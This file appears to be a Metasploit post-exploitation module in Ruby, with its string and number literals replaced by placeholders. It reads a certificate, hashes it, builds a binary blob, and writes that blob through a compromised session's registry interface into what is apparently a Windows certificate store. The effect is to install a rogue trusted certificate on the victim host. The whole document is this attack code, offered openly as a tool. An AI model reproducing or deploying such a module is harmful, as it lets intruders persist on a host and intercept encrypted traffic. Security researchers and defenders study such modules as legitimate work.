require <str> class Metasploit3 < Msf :: Post def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > BSD_LICENSE , <str> = > [ <str> ] , <str> = > [ <str> ] , <str> = > [ <str> ] ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) ] , self . class ) end def run certfile = datastore [ <str> ] begin :: File . stat ( certfile ) rescue print_error ( <str> ) return end cert = <str> f = :: File . open ( certfile , <str> ) cert = f . read ( f . stat . size ) f . close loadedcert = OpenSSL :: X509 :: Certificate . new ( cert ) certmd5 = Digest :: MD5 . hexdigest ( loadedcert . to_der ) . scan ( <str> ) certsha1 = Digest :: SHA1 . hexdigest ( loadedcert . to_der ) . scan ( <str> ) cskiray = loadedcert . extensions [ <int> ] . value . gsub ( <str> , <str> ) . scan ( <str> ) derLength = loadedcert . to_der . length . to_s ( <int> ) if ( derLength . length < <int> ) derLength = <str> derLength <str> end derRay = derLength . scan ( <str> ) hexDerLength = [ derRay [ <int> ] , derRay [ <int> ] ] certder = loadedcert . to_der . each_byte . collect { | val | <str> % val } bblob = [ <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> ] bblob += certmd5 bblob += [ <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> ] bblob += certsha1 bblob += [ <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> ] bblob += cskiray bblob += [ <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> ] bblob += hexDerLength bblob += [ <str> , <str> ] bblob += certder blob = bblob . map ( & <str> ) . pack ( <str> ) cleancertsha1 = certsha1 . to_s . gsub ( <str> , <str> ) . gsub ( <str> , <str> ) . upcase catree = <str> entire_key = <str> catree <str> cleancertsha1 <str> root_key , base_key = client . sys . registry . splitkey ( entire_key ) begin open_key = nil open_key = client . sys . registry . open_key ( root_key , base_key , KEY_READ + <hex> ) values = open_key . enum_value if ( values . length > <int> ) print_error ( <str> ) return end rescue open_key = nil open_key = client . sys . registry . create_key ( root_key , base_key , KEY_WRITE + <hex> ) print_status ( <str> entire_key <str> ) open_key . set_value ( <str> , REG_BINARY , blob ) print_good ( <str> ) end end end 
